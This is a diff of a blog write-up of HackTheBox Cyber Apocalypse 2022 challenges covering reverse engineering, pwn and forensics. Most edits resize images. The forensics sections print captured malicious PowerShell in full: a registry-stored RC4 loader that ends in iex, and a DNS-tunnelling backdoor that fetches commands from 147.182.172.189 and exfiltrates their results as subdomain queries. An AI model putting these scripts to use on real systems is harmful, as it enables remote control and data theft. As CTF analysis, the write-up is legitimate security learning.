@@ -11,7 +11,7 @@ excerpt: "Writeup of some of the challenges in the 2022 Cyber Apocalypse CTF"
 ---
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/eventlogo.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/eventlogo.png" alt="drawing" width="900"/>
 </p>
 
 # Reverse
@@ -21,13 +21,13 @@ excerpt: "Writeup of some of the challenges in the 2022 Cyber Apocalypse CTF"
 Opening the application with ghidra and starting from the main function. Following the code to the menu function it was easy to see that, if option 6 was selected a password was requested and the input compared with the string "sup3rs3cr3tw1d3"
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/wide_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/wide_1.png" alt="drawing" width="600"/>
 </p>
 
 Launching the application and following the logic above to get me the flag.
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/wide_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/wide_2.png" alt="drawing" width="900"/>
 </p>
 
 FLAG: **HTB{str1ngs_4r3nt_4lw4ys_4sc11}**
@@ -97,14 +97,14 @@ After downloading the challenge I started analyzing it with Ghidra. I started ch
 For the input it was clear that I needed a 32 char input otherwise I would get an error message saying that the password length was incorrect.
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_1.png" alt="drawing" width="600"/>
 </p>
 
 
 Continuing debugging, there was an array called encrypted being cored with a key
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_2.png" alt="drawing" width="600"/>
 </p>
 
 
@@ -113,7 +113,7 @@ I got both values and tried myself, but for some reason I got nothing! So I deci
 Started the application with 32 "A" chars as input and when the breakpoint was hit I got the first letter of the flag
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_3.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_3.png" alt="drawing" width="600"/>
 </p>
 
 0x48 -> H
@@ -194,13 +194,13 @@ Running it and it was the snake game... it is fun but it wont help with the chal
 
 I started a python2 (the application runs python2) shell and I loaded the initial variables that were marshelled at the beginning.
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/snakecode_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/snakecode_1.png" alt="drawing" width="900"/>
 </p>
 
 Then I imported **dis**, that will allow to disassemble the marshalled code. Using dis. Dis (variable), I went through all the variables to one of those gave me the flag
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/snakecode_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/snakecode_2.png" alt="drawing" width="500"/>
 </p>
 
 
@@ -213,7 +213,7 @@ FLAG: **HTB{SuP3r_S3CRt_Sn4k3c0d3}**
 After downloading the file, I opened up Ghidra and started analyzing it. Following the code I got to a check_password function
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/without_a_trace_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/without_a_trace_1.png" alt="drawing" width="500"/>
 </p>
 
 There was a ptrace, which is one of the most basic ways of preventing a program from being debugged in Linux, and given the challenge name.... well, I fired GDB and in order to bypass this I set
@@ -230,14 +230,16 @@ nexti
 ```
 
 I had to repeat it once again
+
 ```
 set $rax=0
 nexti
+```
 
 and finally the flag appeared
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/without_a_trace_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/without_a_trace_2.png" alt="drawing" width="500"/>
 </p>
 
 
@@ -248,18 +250,18 @@ FLAG: **HTB{tr4c3_m3_up_b4_u_g0g0}**
 After downloading all files, I started analyzing the application. 
 Fired Ghidra and since the application was stripped, I search for the term "something wrong" which was the output of the program when I executed it, and saw that it was looping through an array 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_1.png" alt="drawing" width="500"/>
 </p>
 
 There were a lot of functions in it
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_2.png" alt="drawing" width="500"/>
 </p>
 
 each one was comparing a letter and if it was true, it was calling the method longjmp with a position number (index)
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_3.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_3.png" alt="drawing" width="500"/>
 </p>
 
 I started asking "could this be the letter of the flag and its position?"... Got all letters and their respective position
@@ -365,21 +367,21 @@ FLAG: **HTB{h0pp1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!}**
 Started by running the app and after a while I saw that it was just asking me for either a card scan or a password. So, checking with ghidra (changed variable names for clarity) made it easy to see that scanning the card wouldn't do much because the if statement will compare "code" with a string, and the code hasn't been changed after it's been allocated, so I focused on the "check_pass" function...
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_1.png" alt="drawing" width="500"/>
 </p>
 
 
 This method is also simple to check once I had renamed some variables
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_2.png" alt="drawing" width="500"/>
 </p>
 
 
 It was reading 15 characters from the user input and comparing it with the first 15 char of the string "0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455" and if it was equal it would quit! So this comparison had to fail! Using a random value got me the flag
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_3.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_3.png" alt="drawing" width="500"/>
 </p>
 
 
@@ -390,14 +392,14 @@ FLAG: **HTB{th3_g4t35_4r3_0p3n!}**
 Running the application with ltrace I saw that it was comparing the input username with the string DRAEGER15th30n34nd0nly4dm1n15tr4  but even with this, I was getting an error.
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_1.png" alt="drawing" width="500"/>
 </p>
 
 Firing up Ghidra and analyzing the application, I realized that because the variable used to store the user input was only 40 bytes and a total of 57 bytes were being stored in the read function.
 
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_2.png" alt="drawing" width="500"/>
 </p>
 
 Since it was using strcmp which will compare strings until it finds a NULL character I just needed to add \x00
@@ -432,7 +434,7 @@ p.kill
 ```
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_3.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_3.png" alt="drawing" width="600"/>
 </p>
 
 
@@ -466,7 +468,7 @@ p.kill
 
 Testing it remotely 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_4.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_4.png" alt="drawing" width="600"/>
 </p>
 
 
@@ -480,7 +482,7 @@ Downloaded the NTUSER.DAT file and went to my windows VM.
 Using RegRipper rr.exe and analyzing the output file I was able to see an interesting powershell command
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_1.png" alt="drawing" width="600"/>
 </p>
 
 
@@ -488,7 +490,7 @@ Using RegRipper rr.exe and analyzing the output file I was able to see an intere
 Using cyberchef I decoded the payload and got a powershell script that needed to be formatted first...
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_2.png" alt="drawing" width="600"/>
 </p>
 
 
@@ -497,130 +499,72 @@ Every 3 points in a row is a point, every other point is nothing... so at the en
 function encr {
 
 param(
-
 [Byte[]]$data,
-
 [Byte[]]$key
-
 )
 
 [Byte[]]$buffer = New-Object Byte[] $dataLength
-
 $dataCopyTo($buffer, 0)
-
 [Byte[]]$s = New-Object Byte[] 256;
-
 [Byte[]]$k = New-Object Byte[] 256;
-
-for ($i = 0; $i -lt 256; $i++)
-
-{
-
+for ($i = 0; $i -lt 256; $i++){
 $s[$i] = [Byte]$i;
-
 $k[$i] = $key[$i % $keyLength];
-
 }
 
 $j = 0;
-
-for ($i = 0; $i -lt 256; $i++)
-
-{
-
+for ($i = 0; $i -lt 256; $i++){
 $j = ($j + $s[$i] + $k[$i]) % 256;
-
 $temp = $s[$i];
-
 $s[$i] = $s[$j];
-
 $s[$j] = $temp;
-
 }
 
 $i = $j = 0;
-
-for ($x = 0; $x -lt $bufferLength; $x++)
-
-{
-
+for ($x = 0; $x -lt $bufferLength; $x++){
 $i = ($i + 1) % 256;
-
 $j = ($j + $s[$i]) % 256;
-
 $temp = $s[$i];
-
 $s[$i] = $s[$j];
-
 $s[$j] = $temp;
-
 [int]$t = ($s[$i] + $s[$j]) % 256;
-
 $buffer[$x] = $buffer[$x] -bxor $s[$t];
-
 }
 
 return $buffer
 
 }
 
-  
-  
-
 function HexToBin {
-
 param(
-
 [Parameter(
-
 Position=0,
-
 Mandatory=$true,
-
 ValueFromPipeline=$true)
-
 ]
 
 [string]$s)
 
 $return = @()
 
-for ($i = 0; $i -lt $sLength ; $i += 2)
-
-{
-
+for ($i = 0; $i -lt $sLength ; $i += 2){
 $return += [Byte]::Parse($sSubstring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
-
 }
-
 Write-Output $return
 
 }
 
-  
-
 [Byte[]]$key = $encGetBytes("Q0mmpr4B5rvZi3pS")
-
 $encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s)t3RBka5tL
-
 $encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen)uLltjjW
-
 $encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq)uY4S39Da
-
 $encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG)Kb19fyhl
-
 $encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O)jH54NW8C
-
 $encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
-
 $enc = [SystemTextEncoding]::ASCII
-
 [Byte[]]$data = HexToBin $encrypted
-
 $DecryptedBytes = encr $data $key
-
 $DecryptedString = $encGetString($DecryptedBytes)
-
 $DecryptedString|iex
 ```
 
@@ -645,7 +589,7 @@ After this, i just ran the poweshell script and got the flag
 
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_3.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_3.png" alt="drawing" width="600"/>
 </p>
 
 
@@ -658,7 +602,7 @@ FLAG: **HTB{g0ld3n_F4ng_1s_n0t__st34lthy_3n0ugh}**
 Once I downloaded the pcap file, I used strings over and I saw a big base64 string... decoding it gave me a ps1 script
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_1.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_1.png" alt="drawing" width="900"/>
 </p>
 
 After decoding it i got
@@ -666,129 +610,76 @@ After decoding it i got
 function Create-AesManagedObject($key, $IV) {
 
 $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
-
 $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-
 $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-
 $aesManaged.BlockSize = 128
-
 $aesManaged.KeySize = 256
 
 if ($IV) {
-
 if ($IV.getType().Name -eq "String") {
-
 $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-
 }
 
 else {
-
 $aesManaged.IV = $IV
-
-  
-
 }
 
 }
 
 if ($key) {
 
-  
-
 if ($key.getType().Name -eq "String") {
-
 $aesManaged.Key = [System.Convert]::FromBase64String($key)
 
 }
 
 else {
-
 $aesManaged.Key = $key
-
 }
 
 }
 
 $aesManaged
-
 }
 
-  
-
 function Create-AesKey() {
-
 $aesManaged = Create-AesManagedObject $key $IV
-
 [System.Convert]::ToBase64String($aesManaged.Key)
 
 }
 
-  
-
 function Encrypt-String($key, $unencryptedString) {
-
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
-
 $aesManaged = Create-AesManagedObject $key
-
 $encryptor = $aesManaged.CreateEncryptor()
-
 $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-
 [byte[]] $fullData = $aesManaged.IV + $encryptedData
-
 $aesManaged.Dispose()
-
 [System.BitConverter]::ToString($fullData).replace("-","")
 
 }
 
-  
-
 function Decrypt-String($key, $encryptedStringWithIV) {
-
 $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
-
 $IV = $bytes[0..15]
-
 $aesManaged = Create-AesManagedObject $key $IV
-
 $decryptor = $aesManaged.CreateDecryptor();
-
 $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-
 $aesManaged.Dispose()
-
 [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
-
 }
 
-  
-
 filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }}
-
 $key = "a1E4MUtycWswTmtrMHdqdg=="
-
 $out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
-
 for ($num = 0 ; $num -le $out.Length-2; $num++){
-
 $encryptedString = $out[$num].Strings[0]
-
 $backToPlainText = Decrypt-String $key $encryptedString
-
 $output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
-
 Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
-
 for ($ans = 0; $ans -lt $pr.length-1; $ans++){
-
 $domain = -join($pr[$ans],".windowsliveupdater.com")
-
 Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
-
 }
 
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
@@ -800,7 +691,7 @@ This script was requesting a DNS TXT to a server with the IP 147.182.172.189.
 Using the wireshack filter **dns && ip.dst == 147.182.172.189** I started following some of the requests until I found an interesting one
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_2.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_2.png" alt="drawing" width="900"/>
 </p>
 
 I then went to the windows VM and edited the initial script so i could run this base64 strings and decrypt its content
@@ -844,12 +735,12 @@ Base64 decode the password got me the first part of the flag
 Looking at the rest of the script I saw that it was encrypting each command response and parsing it into hex and storing it in an array. It was then making a DNS request with each hex from the total array of responses as a "subdomain"
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_4.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_4.png" alt="drawing" width="600"/>
 </p>
 
 I went back to wireshark and filtered for DNS once again and saved the filtered pcap. Than with strings command I did **strings -n8 test.pcap** revealing all hex
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_5.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_5.png" alt="drawing" width="400"/>
 </p>
 
 I used python to parse this and eliminate duplicates and output a base64 encode.
@@ -882,16 +773,17 @@ print(result)
 
 The result was a list of base64 that I used in the windows VM once again
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_6.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_6.png" alt="drawing" width="900"/>
 </p>
 
 The output geve the 2nd part of the flag!
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_7.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_7.png" alt="drawing" width="900"/>
 </p>
 
 
-This 2nd part was a bit messed up but it was easy to rebuild by hand... putting it all toghether i got the flag
+This 2nd part was a bit messed up but it was easy to rebuild by hand... putting it all toghether i got the flag.
+
 FLAG: **HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}**
 
 
@@ -950,7 +842,7 @@ Starting the instance and connecting with nc i got the flag
 
 
 <p align="center">
-    <img src="/assets/images/ctf_cyberapocalypse2022/crypto/android_in_the_middle.png" alt="drawing" width="350"/>
+    <img src="/assets/images/ctf_cyberapocalypse2022/crypto/android_in_the_middle.png" alt="drawing" width="900"/>
 </p>
 
 
